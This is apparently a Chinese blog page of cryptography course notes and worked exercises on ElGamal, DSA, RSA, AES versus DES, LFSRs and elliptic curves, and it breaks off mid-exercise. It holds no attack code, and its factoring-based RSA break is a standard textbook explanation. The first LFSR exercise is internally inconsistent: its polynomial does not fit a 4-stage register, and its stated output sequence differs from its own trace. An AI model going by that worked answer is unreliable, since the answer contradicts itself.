</ul>
<p><strong>验签</strong>：</p>
<ul>
<li>消息 $ m $</li>
<li>签名 $ (r, s) $</li>
<li>公钥 $ y $</li>
<li>$ g $</li>
<li>验证方程<br>$ g^{H(m)} \equiv y^r \cdot r^s \mod p $</li>
</ul>
<h5 id="DSA（数字签名算法）"><a href="#DSA（数字签名算法）" class="headerlink" title="DSA（数字签名算法）"></a>DSA（数字签名算法）</h5><p><strong>签名</strong>：</p>
<ul>
<li>消息 $ m $</li>
<li>私钥 $ x $</li>
<li>公钥 $ y = g^x \mod p $</li>
<li>随机数 $ k $</li>
<li>哈希值 $ H(m) $</li>
<li>参数 $ p, q, g $</li>
<li>签名 $ (r, s) $<br>$ r \equiv (g^k \mod p) \mod q $<br>$ s \equiv (H(m) + xr) \cdot k^{-1} \mod q $</li>
</ul>
<p><strong>验签</strong>：</p>
<ul>
<li>消息 $ m $</li>
<li>签名 $ (r, s) $</li>
<li>公钥 $ y $</li>
<li>参数 $ p, q, g $</li>
<li>哈希值 $ H(m) $</li>
<li>验证过程<br>$ w \equiv s^{-1} \mod q $<br>$ u_1 \equiv H(m) \cdot w \mod q $<br>$ u_2 \equiv r \cdot w \mod q $<br>$ v \equiv ((g^{u_1} \cdot y^{u_2}) \mod p) \mod q $<br>签名有效当且仅当 $ v = r $</li>
</ul>
<h4 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h4><h5 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h5><ol>
<li><p><strong>加密</strong>：</p>
<ul>
<li>使用接收者的公钥 $ (e, n) $ 对明文 $ M $ 进行加密，计算密文 $ C $。</li>
<li>$ C \equiv M^e \mod n $</li>
</ul>
</li>
<li><p><strong>解密</strong>：</p>
<ul>
<li>使用接收者的私钥 $ (d, n) $ 对密文 $ C $ 进行解密，恢复出明文 $ M $。</li>
<li>$ M \equiv C^d \mod n $</li>
</ul>
</li>
<li><p><strong>签名</strong>：</p>
<ul>
<li>使用发送者的私钥 $ (d, n) $ 对消息 $ M $ 进行签名，计算签名值 $ S $。</li>
<li>$ S \equiv M^d \mod n $</li>
</ul>
</li>
<li><p><strong>验签</strong>：</p>
<ul>
<li>使用发送者的公钥 $ (e, n) $ 对签名 $ S $ 进行验证，检查是否恢复出原消息 $ M $。</li>
<li>$ M \equiv S^e \mod n $</li>
</ul>
</li>
</ol>
<h5 id="ElGamal-1"><a href="#ElGamal-1" class="headerlink" title="ElGamal"></a>ElGamal</h5><ol>
<li><p><strong>加密</strong>：</p>
<ul>
<li>使用接收者的公钥 $ (p, g, y) $ 和随机数 $ k $ 对明文 $ M $ 进行加密，计算密文 $ (C_1, C_2) $。</li>
<li>$ C_1 \equiv g^k \mod p $</li>
<li>$ C_2 \equiv y^k \cdot M \mod p $</li>
</ul>
</li>
<li><p><strong>解密</strong>：</p>
<ul>
<li>使用接收者的私钥 $ x $ 对密文 $ (C_1, C_2) $ 进行解密，恢复出明文 $ M $。</li>
<li>$ M \equiv C_2 \cdot (C_1)^{-x} \mod p $</li>
</ul>
</li>
<li><p><strong>签名</strong>：</p>
<ul>
<li>使用发送者的私钥 $ x $、随机数 $ k $ 和消息 $ m $ 进行签名，计算签名值 $ (r, s) $。</li>
<li>$ r \equiv g^k \mod p $</li>
<li>$ s \equiv (H(m) - xr) \cdot k^{-1} \mod (p-1) $</li>
</ul>
</li>
<li><p><strong>验签</strong>：</p>
<ul>
<li>使用发送者的公钥 $ y $、生成元 $ g $ 和消息 $ m $ 进行验证，检查签名 $ (r, s) $ 的有效性。</li>
<li>$ g^{H(m)} \equiv y^r \cdot r^s \mod p $</li>
</ul>
</li>
</ol>
<h5 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h5><ol>
<li><p><strong>签名</strong>：</p>
<ul>
<li>使用发送者的私钥 $ x $、随机数 $ k $ 和消息 $ m $ 进行签名，计算签名值 $ (r, s) $。</li>
<li>$ r \equiv (g^k \mod p) \mod q $</li>
<li>$ s \equiv (H(m) + xr) \cdot k^{-1} \mod q $</li>
</ul>
</li>
<li><p><strong>验签</strong>：</p>
<ul>
<li>使用发送者的公钥 $ y $、生成元 $ g $、参数 $ p, q $ 和消息 $ m $ 进行验证，检查签名 $ (r, s) $ 的有效性。</li>
<li>计算 $ w \equiv s^{-1} \mod q $</li>
<li>计算 $ u_1 \equiv H(m) \cdot w \mod q $</li>
<li>计算 $ u_2 \equiv r \cdot w \mod q $</li>
<li>计算 $ v \equiv ((g^{u_1} \cdot y^{u_2}) \mod p) \mod q $</li>
<li>签名有效当且仅当 $ v = r $</li>
</ul>
</li>
</ol>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="说明AES和DES设计的不同之处。"><a href="#说明AES和DES设计的不同之处。" class="headerlink" title="说明AES和DES设计的不同之处。"></a><strong>说明AES和DES设计的不同之处。</strong></h4><p>AES和DES设计的不同之处</p>
<ol>
<li><p><strong>密钥长度</strong>：</p>
<ul>
<li><strong>AES</strong>：支持128位、192位和256位的密钥长度。</li>
<li><strong>DES</strong>：固定56位的密钥长度（尽管通常表示为64位，但其中8位用于奇偶校验）。</li>
</ul>
</li>
<li><p><strong>分组长度</strong>：</p>
<ul>
<li><strong>AES</strong>：固定128位的分组长度。</li>
<li><strong>DES</strong>：固定64位的分组长度。</li>
</ul>
</li>
<li><p><strong>算法结构</strong>：</p>
<ul>
<li><strong>AES</strong>：基于替代-置换网络（Substitution-Permutation Network, SPN）。使用S盒和P盒来实现复杂的替代和置换操作。</li>
<li><strong>DES</strong>：基于费斯妥尔网络（Feistel Network）。每一轮将数据分成两半，交替进行加密和交换。</li>
</ul>
</li>
<li><p><strong>轮数</strong>：</p>
<ul>
<li><strong>AES</strong>：轮数取决于密钥长度：128位密钥为10轮，192位密钥为12轮，256位密钥为14轮。</li>
<li><strong>DES</strong>：固定为16轮。</li>
</ul>
</li>
<li><p><strong>安全性</strong>：</p>
<ul>
<li><strong>AES</strong>：设计更为现代，考虑了更多的密码分析攻击，现阶段没有已知的有效攻击方式。</li>
<li><strong>DES</strong>：由于密钥长度较短，容易受到暴力破解攻击，已经被认为是不安全的。</li>
</ul>
</li>
<li><p><strong>硬件和软件实现</strong>：</p>
<ul>
<li><strong>AES</strong>：设计时考虑了高效的硬件和软件实现，特别是对现代处理器进行了优化。</li>
<li><strong>DES</strong>：设计较早，硬件实现相对简单，但在现代处理器上的效率较低。</li>
</ul>
</li>
</ol>
<p>总结</p>
<p>AES设计更加现代化，具有更高的安全性和灵活性，已经取代DES成为主流的对称加密标准。</p>
<p>LFSR的初始值被称为伪随机序列的种子，影响下一个状态的比特位叫做抽头。LFSR的触发器编号一般从1开始，抽头取值范围是1到2n-1。抽头序列可以用来描述该LFSR的反馈多项式。由n个触发器构成的LFSR电路可以产生一个周期为2n-1的序列。理论表明，要使<strong>LFSR</strong>得到最长的周期，这个抽头序列构成的多项式加<strong>1</strong>就是其反馈多项式<strong>，</strong>必须是一个<strong>本原多项式</strong>，也就是说这个多项式不可约，比方下图的抽头序列为$(4,1)$，其对应的反馈多项式为$f\left( x \right)=x{}^\text{4}+x+1$，其对应的线性反馈移位寄存器电路如下所示。</p>
<img src="/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/1421957-20191128105251729-1844301536.png" class="" title="img">
<p>假设$a_3$,$a_2$,$a_1$,$a_0$的初始值各自是<strong>1 0 0 0</strong>，反馈函数选取$f\left( x \right)=x{}^\text{4}+x+1$，那么得到例如以下序列</p>
<img src="/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/1421957-20191128105551836-779974532.png" class="" title="img">
<p> 能够看出周期为<strong>15</strong>。在这一个周期里面涵盖了开区间$(0,2^4)$内的全部整数，而且都是没有固定顺序出现的，有非常好的随机性。</p>
<h4 id="4级-LFSR-的特征多项式为-f-left-x-right-x-x-text-2-1-初始态为-0-0-1-1-。求输出序列及其周期。"><a href="#4级-LFSR-的特征多项式为-f-left-x-right-x-x-text-2-1-初始态为-0-0-1-1-。求输出序列及其周期。" class="headerlink" title="4级$LFSR$的特征多项式为 $f\left( x \right)=x+x{}^\text{2}+1$初始态为$(0,0,1,1)$。求输出序列及其周期。"></a>4级$LFSR$的特征多项式为 $f\left( x \right)=x+x{}^\text{2}+1$初始态为$(0,0,1,1)$。求输出序列及其周期。</h4><p>为了求解4级LFSR的输出序列及其周期，我们需要了解$LFSR$的工作机制。特征多项式为$f(x) = x + x^2 + 1$，这意味着$LFSR$的反馈函数是基于特定位置的位进行异或操作。</p>
<p>初始态 $(0, 0, 1, 1)$</p>
<p>我们从这个初始态开始，依次计算$LFSR$的输出序列。</p>
<p>计算过程</p>
<ol>
<li><strong>当前状态：</strong> (0, 0, 1, 1)<ul>
<li>新的比特：$1 \oplus 1 = 0$</li>
<li>更新状态：$(0, 0, 0, 1)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 0, 0, 1)<ul>
<li>新的比特：$0 \oplus 1 = 1$</li>
<li>更新状态：$(1, 0, 0, 0)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 0, 0, 0)<ul>
<li>新的比特：$0 \oplus 0 = 0$</li>
<li>更新状态：$(0, 1, 0, 0)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 1, 0, 0)<ul>
<li>新的比特：$0 \oplus 0 = 0$</li>
<li>更新状态：$(0, 0, 1, 0)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 0, 1, 0)<ul>
<li>新的比特：$1 \oplus 0 = 1$</li>
<li>更新状态：$(1, 0, 0, 1)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 0, 0, 1)<ul>
<li>新的比特：$0 \oplus 1 = 1$</li>
<li>更新状态：$(1, 1, 0, 0)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 1, 0, 0)<ul>
<li>新的比特：$0 \oplus 0 = 0$</li>
<li>更新状态：$(0, 1, 1, 0)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 1, 1, 0)<ul>
<li>新的比特：$1 \oplus 0 = 1$</li>
<li>更新状态：$(1 ,0, 1, 1)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 0, 1, 1)<ul>
<li>新的比特：$1 \oplus 1 = 0$</li>
<li>更新状态：$(0 ,1, 0, 1)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 1, 0, 1)<ul>
<li>新的比特：$0 \oplus 1 = 1$</li>
<li>更新状态：$(1 ,0, 1, 0)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 0, 1, 0)<ul>
<li>新的比特：$0 \oplus 1 = 1$</li>
<li>更新状态：$(1 ,1, 0, 1)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 1, 0, 1)<ul>
<li>新的比特：$0 \oplus 1 = 1$</li>
<li>更新状态：$(1 ,1, 1, 0)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 1, 1, 0)<ul>
<li>新的比特：$0 \oplus 1 = 1$</li>
<li>更新状态：$(1 ,1, 1, 1)$</li>
<li>输出比特：$0$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (1, 1, 1, 1)<ul>
<li>新的比特：$1 \oplus 1 = 0$</li>
<li>更新状态：$(0 ,1, 1, 1)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 1, 1, 1)<ul>
<li>新的比特：$1 \oplus 1 = 0$</li>
<li>更新状态：$(0 ,0, 1, 1)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
<li><strong>当前状态：</strong> (0, 0, 1, 1)<ul>
<li>新的比特：$1 \oplus 1 = 0$</li>
<li>更新状态：$(0 ,0, 0, 1)$</li>
<li>输出比特：$1$</li>
</ul>
</li>
</ol>
<p>输出序列及周期</p>
<ul>
<li><strong>输出序列：</strong> 11000 10011 01011 1…</li>
<li><strong>周期：</strong> 15（此处说明：在计算过程中发现某些状态（如$(1, 0, 0, 1)$）会重复，而生成的比特序列也重复）</li>
</ul>
<p>总结</p>
<p>通过以上计算，我们得到了4级LFSR的输出序列和其周期。根据给定的特征多项式$f(x) = x + x^2 + 1$，初始态(0, 0, 1, 1)产生了周期为15的输出序列11000 10011 01011。</p>
<h4 id="公钥密码算法一般是建立在对一个特定的数学难题求解上，该难题无法求解则密码算法安全，-RSA-算法基于大整数的素因子分解难题，如果该难题可以求解，简述一下，你是如何利用发送者的公钥和截取的密文破译求解出明文的。"><a href="#公钥密码算法一般是建立在对一个特定的数学难题求解上，该难题无法求解则密码算法安全，-RSA-算法基于大整数的素因子分解难题，如果该难题可以求解，简述一下，你是如何利用发送者的公钥和截取的密文破译求解出明文的。" class="headerlink" title="公钥密码算法一般是建立在对一个特定的数学难题求解上，该难题无法求解则密码算法安全，$RSA$算法基于大整数的素因子分解难题，如果该难题可以求解，简述一下，你是如何利用发送者的公钥和截取的密文破译求解出明文的。"></a>公钥密码算法一般是建立在对一个特定的数学难题求解上，该难题无法求解则密码算法安全，$RSA$算法基于大整数的素因子分解难题，如果该难题可以求解，简述一下，你是如何利用发送者的公钥和截取的密文破译求解出明文的。</h4><p>RSA算法简介</p>
<p>RSA（Rivest-Shamir-Adleman）是一种基于大整数分解难题的公钥密码算法。RSA算法的核心在于两个大素数的乘积，以及在大素数分解上计算的困难性。其主要包括三个步骤：密钥生成、加密和解密。</p>
<p>密钥生成：</p>
<ol>
<li>选择两个大素数 $p $ 和 $q $。</li>
<li>计算 $n = pq $，这是模数。</li>
<li>计算 $\phi(n) = (p-1)(q-1) $，这是欧拉函数。</li>
<li>选择一个整数 $e $，满足 $1 &lt; e &lt; \phi(n) $ 且 $e $ 与 $\phi(n) $ 互质。</li>
<li>计算 $d $，满足 $ed \equiv 1 \ (\text{mod} \ \phi(n)) $。</li>
</ol>
<p>公钥为 $(e, n) $，私钥为 $(d, n) $。</p>
<p>加密：</p>
<p>使用公钥 $(e, n) $，将明文 $M $ 转换为密文 $C $：<br>$ C = M^e \ (\text{mod} \ n) $</p>
<p>解密：</p>
<p>使用私钥 $(d, n) $，将密文 $C $ 还原为明文 $M $：<br>$ M = C^d \ (\text{mod} \ n) $</p>
<h5 id="破译RSA的过程"><a href="#破译RSA的过程" class="headerlink" title="破译RSA的过程"></a>破译RSA的过程</h5><p>假设敌手（攻击者）可以解决大整数的素因子分解问题，他们可以破译RSA的过程如下：</p>
<ol>
<li><p><strong>截取密文</strong>：<br>攻击者截取发送者发送的密文 $C $。</p>
</li>
<li><p><strong>已知公钥</strong>：<br>攻击者已知发送者的公钥 $(e, n) $。</p>
</li>
<li><p><strong>分解模数 $n $</strong>：<br>攻击者利用素因子分解技术将 $n $ 分解为两个大素数 $p $ 和 $q $。</p>
</li>
<li><p><strong>计算欧拉函数</strong>：<br>攻击者计算欧拉函数 $\phi(n) $：<br>$ \phi(n) = (p-1)(q-1) $</p>
</li>
<li><p><strong>求解私钥 $d $</strong>：<br>攻击者利用已知的 $e $ 和 $\phi(n) $ 计算私钥 $d $：<br>$ d \equiv e^{-1} \ (\text{mod} \ \phi(n)) $<br>即找到一个 $d $ 使得 $ed \equiv 1 \ (\text{mod} \ \phi(n)) $。</p>
</li>
<li><p><strong>解密密文</strong>：<br>使用计算得到的私钥 $d $，攻击者将密文 $C $ 解密为明文 $M $：<br>$ M = C^d \ (\text{mod} \ n) $</p>
</li>
</ol>
<h5 id="示例解密过程"><a href="#示例解密过程" class="headerlink" title="示例解密过程"></a>示例解密过程</h5><p>假设截取的密文为 $C $ ，公钥为 $(e, n) $，且攻击者能够分解 $n $ 。</p>
<ol>
<li><p><strong>已知公钥 $(e, n) $</strong>：<br>$ e = 7, \ n = 33 $</p>
</li>
<li><p><strong>分解模数 $n $</strong>：<br>$ n = 33 = 3 \times 11 $<br>这样 $p = 3 $ 和 $q = 11 $。</p>
</li>
<li><p><strong>计算欧拉函数 $\phi(n) $</strong>：<br>$ \phi(n) = (3-1)(11-1) = 2 \times 10 = 20 $</p>
</li>
<li><p><strong>求解私钥 $d $</strong>：<br>$ d \equiv 7^{-1} \ (\text{mod} \ 20) $<br>求解得到 $d = 3 $，因为 $7 \times 3 = 21 \equiv 1 \ (\text{mod} \ 20) $。</p>
</li>
<li><p><strong>解密密文 $C $</strong>：<br>假设截获的密文 $C = 10 $，使用私钥 $d = 3 $ 进行解密：<br>$ M = 10^3 \ (\text{mod} \ 33) = 1000 \ (\text{mod} \ 33) = 10 $</p>
<p>所以解密得到的明文 $M = 10 $。</p>
</li>
</ol>
<p>通过上述过程，攻击者能够成功解密密文，破译出原文。这也说明了RSA算法的安全性依赖于大整数分解问题的计算复杂度。如果这个问题可以被有效解决，RSA算法就会被攻破。</p>
<h4 id="在RSA加密算法中-设-p-3-q-7-e-5-计算d并求出明文-m-2-所对应的密文c。"><a href="#在RSA加密算法中-设-p-3-q-7-e-5-计算d并求出明文-m-2-所对应的密文c。" class="headerlink" title="在RSA加密算法中, 设 $p=3,q=7,e=5,$计算d并求出明文 $m=2$所对应的密文c。"></a>在RSA加密算法中, 设 $p=3,q=7,e=5,$计算d并求出明文 $m=2$所对应的密文c。</h4><p>在RSA加密算法中，给定素数 $ p = 3 $ 和 $ q = 7 $，以及公钥指数 $ e = 5 $，我们需要计算私钥 $ d $ 并求出明文 $ m = 2 $ 所对应的密文 $ c $。</p>
<p>计算步骤</p>
<ol>
<li>计算模数 $ n $</li>
</ol>
<p>$ n = p \times q = 3 \times 7 = 21 $</p>
<ol>
<li>计算欧拉函数 $ \phi(n) $</li>
</ol>
<p>$ \phi(n) = (p - 1)(q - 1) = (3 - 1)(7 - 1) = 2 \times 6 = 12 $</p>
<ol>
<li>计算私钥 $ d $</li>
</ol>
<p>私钥 $ d $ 满足下列同余式：<br>$ d \equiv e^{-1} \pmod{\phi(n)} $</p>
<p>我们需要找到一个 $ d $ 使得：<br>$ 5d \equiv 1 \pmod{12} $</p>
<p>使用扩展欧几里得算法或者通过试验可以找到 $ d $：<br>$ 5d \equiv 1 \pmod{12} $</p>
<p>逐次尝试 $ d $ 的值：</p>
<ul>
<li>当 $ d = 1 $ 时，$ 5 \times 1 = 5 \not\equiv 1 \pmod{12} $</li>
<li>当 $ d = 2 $ 时，$ 5 \times 2 = 10 \not\equiv 1 \pmod{12} $</li>
<li>当 $ d = 3 $ 时，$ 5 \times 3 = 15 \not\equiv 1 \pmod{12} $</li>
<li>当 $ d = 4 $ 时，$ 5 \times 4 = 20 \not\equiv 1 \pmod{12} $</li>
<li>当 $ d = 5 $ 时，$ 5 \times 5 = 25 \equiv 1 \pmod{12} $</li>
</ul>
<p>所以 $ d = 5 $。</p>
<ol>
<li>加密明文 $ m = 2 $</li>
</ol>
<p>加密公式为：<br>$ c = m^e \pmod{n} $</p>
<p>将值代入公式：</p>
<p>$c = 2^5 \pmod{21}$</p>
<p>$c = 32 \pmod{21} = 11$</p>
<p>结果</p>
<ul>
<li>私钥 $ d = 5 $</li>
<li>明文 $ m = 2 $ 所对应的密文 $ c = 11 $</li>
</ul>
<p>因此，使用给定的参数 $ p = 3 $、$ q = 7 $、$ e = 5 $，计算得出私钥 $ d = 5 $ 和密文 $ c = 11 $。</p>
<h4 id="在-ElGamal-公钥密码体制中-Bob-选取-p-17-生成元-g-3-私钥-x-6-Alice选取-Bob-的公钥对消息明文-m-5-进行加密，随机数为-3-。求-m-的密文。"><a href="#在-ElGamal-公钥密码体制中-Bob-选取-p-17-生成元-g-3-私钥-x-6-Alice选取-Bob-的公钥对消息明文-m-5-进行加密，随机数为-3-。求-m-的密文。" class="headerlink" title="在$ElGamal$公钥密码体制中, $Bob$选取$p=17$,生成元$g=3$,私钥$x=6$,Alice选取$Bob$的公钥对消息明文$m=5$进行加密，随机数为$3$。求$m$的密文。"></a>在$ElGamal$公钥密码体制中, $Bob$选取$p=17$,生成元$g=3$,私钥$x=6$,Alice选取$Bob$的公钥对消息明文$m=5$进行加密，随机数为$3$。求$m$的密文。</h4><p>在$ElGamal$公钥密码体制中，我们有以下参数：</p>
<ul>
<li>$ p = 17 $</li>
<li>生成元 $ g = 3 $</li>
<li>Bob 的私钥 $ x = 6 $</li>
<li>Alice 选择的随机数 $ k = 3 $</li>
<li>明文 $ m = 5 $</li>
</ul>
<p>我们需要计算消息 $ m $ 的密文。</p>
<p><strong>计算步骤</strong></p>
<p>计算$ Bob$ 的公钥 $ y $</p>
<p>$ y = g^x \mod p $<br>$ y = 3^6 \mod 17 $<br>$ y = 729 \mod 17 $<br>$ y = 15 $</p>
<p>计算密文的两个部分 $ C_1 $ 和 $ C_2 $</p>
<p>计算 $ C_1 $</p>
<p>$ C_1 = g^k \mod p $<br>$ C_1 = 3^3 \mod 17 $<br>$ C_1 = 27 \mod 17 $<br>$ C_1 = 10 $</p>
<p>计算 $ C_2 $</p>
<p>$ C_2 = m \times y^k \mod p $<br>$ C_2 = 5 \times 15^3 \mod 17 $</p>
<p>计算 $ 15^3 \mod 17 $:<br>$ 15^3 = 3375 $<br>$ 3375 \mod 17 = 3375 - 17 \times 198 = 3375 - 3366 = 9 $</p>
<p>计算 $ 5 \times 9 \mod 17 $:<br>$ C_2 = 5 \times 9 \mod 17 = 11 $</p>
<p>因此，明文 $ m = 5 $ 所对应的密文为 $ (C_1, C_2) = (10, 11) $</p>
<p>所以，加密后的密文是：<br>$ (C_1, C_2) = (10, 11) $</p>
<h4 id="若某LFSR的级数为-n-3-，已知-2n-长密文段-c-left-011001-right-对应明文段-m-left-101101-right-请给出其反馈函数表达式。"><a href="#若某LFSR的级数为-n-3-，已知-2n-长密文段-c-left-011001-right-对应明文段-m-left-101101-right-请给出其反馈函数表达式。" class="headerlink" title="若某LFSR的级数为 $n=3$，已知$2n$长密文段 $c=\left( 011001 \right),$对应明文段 $m=\left( 101101 \right),$请给出其反馈函数表达式。"></a>若某LFSR的级数为 $n=3$，已知$2n$长密文段 $c=\left( 011001 \right),$对应明文段 $m=\left( 101101 \right),$请给出其反馈函数表达式。</h4><p>为了找到这个$LFSR$的反馈函数，我们需要用给出的明文段和密文段推导出反馈多项式。</p>
<p>给定：<br>$ n = 3 $<br>$ c = (011001) $<br>$ m = (101101) $</p>
<p>我们知道密文 $ c $ 和明文 $ m $ 的关系是通过$LFSR$生成序列 $ k $ 进行异或得到的，即：<br>$ c_i = m_i \oplus k_i $</p>
<p>通过这个关系我们可以求出$LFSR$生成序列 $ k $：</p>
<ol>
<li>$ c_1 = m_1 \oplus k_1 \rightarrow 0 = 1 \oplus k_1 \rightarrow k_1 = 1 $</li>
<li>$ c_2 = m_2 \oplus k_2 \rightarrow 1 = 0 \oplus k_2 \rightarrow k_2 = 1 $</li>
<li>$ c_3 = m_3 \oplus k_3 \rightarrow 1 = 1 \oplus k_3 \rightarrow k_3 = 0 $</li>
<li>$ c_4 = m_4 \oplus k_4 \rightarrow 0 = 1 \oplus k_4 \rightarrow k_4 = 1 $</li>
<li>$ c_5 = m_5 \oplus k_5 \rightarrow 0 = 0 \oplus k_5 \rightarrow k_5 = 0 $</li>
<li>$ c_6 = m_6 \oplus k_6 \rightarrow 1 = 1 \oplus k_6 \rightarrow k_6 = 0 $</li>
</ol>
<p>所以$LFSR$生成序列 $ k $ 为 $ (110100) $。</p>
<p>假设反馈多项式为 $ f(x) = 1 + c_1 x + c_2 x^2 + c_3 x^3 $，我们需要找到 $ c_1 $, $ c_2 $, 和 $ c_3 $。</p>
<p>观察$LFSR$生成序列 $ k = (110100) $：</p>
<ol>
<li>$ k_4 = c_1 k_3 \oplus c_2 k_2 \oplus c_3 k_1 \rightarrow 1 = c_1 \cdot 0 \oplus c_2 \cdot 1 \oplus c_3 \cdot 1 \rightarrow 1 = c_2 \oplus c_3 $</li>
<li>$ k_5 = c_1 k_4 \oplus c_2 k_3 \oplus c_3 k_2 \rightarrow 0 = c_1 \cdot 1 \oplus c_2 \cdot 0 \oplus c_3 \cdot 1 \rightarrow 0 = c_1 \oplus c_3 $</li>
<li>$ k_6 = c_1 k_5 \oplus c_2 k_4 \oplus c_3 k_3 \rightarrow 0 = c_1 \cdot 0 \oplus c_2 \cdot 1 \oplus c_3 \cdot 0 \rightarrow 0 = c_2 $</li>
</ol>
<p>从方程3可以得到 $ c_2 = 0 $。</p>
<p>代入方程1，得到 $ 1 = 0 \oplus c_3 \rightarrow c_3 = 1 $。</p>
<p>代入方程2，得到 $ 0 = c_1 \oplus 1 \rightarrow c_1 = 1 $。</p>
<p>所以反馈函数的表达式为：<br>$ f(x) = 1 + x + x^3 $</p>
<p>总结<br>$S <em> {n+3} = S </em> {n+2} \oplus S_n$</p>
<p>反馈函数为$f(a_1,a_2,a_3) \equiv (a_1+a_3) \mod{2}$</p>
<h4 id="在-GF-23-上的一条椭圆曲线-y-text-2-x-text-3-x-1-设-g-left-6-text-4-right-取私钥-a-3-。公钥为-b-a-cdot-g-3-left-6-text-4-right-left-7-text-12-right-。若想加密明文-m-left-5-text-4-right-随机选取-k-2-，则密文-c-是什么？请给出加解密过程。"><a href="#在-GF-23-上的一条椭圆曲线-y-text-2-x-text-3-x-1-设-g-left-6-text-4-right-取私钥-a-3-。公钥为-b-a-cdot-g-3-left-6-text-4-right-left-7-text-12-right-。若想加密明文-m-left-5-text-4-right-随机选取-k-2-，则密文-c-是什么？请给出加解密过程。" class="headerlink" title="在 $GF_{23}$ 上的一条椭圆曲线 $y{}^\text{2}=x{}^\text{3}+x+1$ , 设 $g=\left( 6\text{,}4 \right)$ , 取私钥 $a=3$ 。公钥为 $b=a \cdot g=3\left( 6\text{,}4 \right)=\left( 7\text{,}12 \right)$ 。若想加密明文 $m=\left( 5\text{,}4 \right)$, 随机选取 $k=2$，则密文 $c$ 是什么？请给出加解密过程。"></a>在 $GF_{23}$ 上的一条椭圆曲线 $y{}^\text{2}=x{}^\text{3}+x+1$ , 设 $g=\left( 6\text{,}4 \right)$ , 取私钥 $a=3$ 。公钥为 $b=a \cdot g=3\left( 6\text{,}4 \right)=\left( 7\text{,}12 \right)$ 。若想加密明文 $m=\left( 5\text{,}4 \right)$, 随机选取 $k=2$，则密文 $c$ 是什么？请给出加解密过程。</h4><p>要加密明文 $ m = (5, 4) $ ，需要用到椭圆曲线上的点运算和公钥。已知椭圆曲线为 $ y^2 = x^3 + x + 1 $ ，基点 $ g = (6, 4) $ ，私钥 $ a = 3 $ ，公钥 $ b = a \cdot g = 3 \cdot (6, 4) = (7, 12) $ ，随机选取的 $ k = 2 $ 。下面是加密和解密的详细过程：</p>
<h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><ol>
<li><p><strong>计算 $ k \cdot g $ ：</strong><br>$ k \cdot g = 2 \cdot (6, 4) $</p>
</li>
<li><p><strong>计算点倍乘 $ 2 \cdot (6, 4) $：</strong></p>
<p>使用椭圆曲线上的点倍乘公式计算：</p>
<ul>
<li><p>先计算 $ 2 \cdot (6, 4) $：<br>设 $ P = (6, 4) $，首先计算斜率 $ \lambda $：<br>$ \lambda = \frac{3x_1^2 + a}{2y_1} \mod 23 $<br>其中 $ a = 1 $， $ P = (x_1, y_1) = (6, 4) $，<br>$ \lambda = \frac{3(6)^2 + 1}{2(4)} \mod 23 = \frac{3 \cdot 36 + 1}{8} \mod 23 = \frac{109}{8} \mod 23 $<br>首先计算 $ 109 \mod 23 $：<br>$ 109 \mod 23 = 17 $<br>接下来计算 $ \frac{17}{8} \mod 23 $ ，可以通过计算 $ 8 $ 在模 $ 23 $ 下的逆元：<br>$ 8^{-1} \mod 23 = 3 $<br>因为 $ 8 \cdot 3 = 24 \equiv 1 \mod 23 $，所以 $ 8^{-1} = 3 $。<br>$ \frac{17}{8} \equiv 17 \cdot 8^{-1} \mod 23 = 17 \cdot 3 \mod 23 = 51 \mod 23 = 5 $<br>所以 $ \lambda = 5 $。</p>
</li>
<li><p>计算 $ (2x_1, 2y_1) $：<br>$ x_2 = \lambda^2 - 2x_1 \mod 23 = 5^2 - 2 \cdot 6 \mod 23 = 25 - 12 \mod 23 = 13 $<br>$ y_2 = \lambda (x_1 - x_2) - y_1 \mod 23 = 5(6 - 13) - 4 \mod 23 = 5(-7) - 4 \mod 23 = -35 - 4 \mod 23 = -39 \mod 23 = 7 $<br>所以 $ 2 \cdot (6, 4) = (13, 7) $。</p>
</li>
</ul>
<p>因此 $ k \cdot g = 2 \cdot (6, 4) = (13, 7) $。</p>
</li>
<li><p><strong>计算 $ k \cdot b $ ：</strong><br>$ k \cdot b = 2 \cdot (7, 12) $</p>
<p>计算 $ 2 \cdot (7, 12) $ ，类似上面的计算：</p>
<ul>
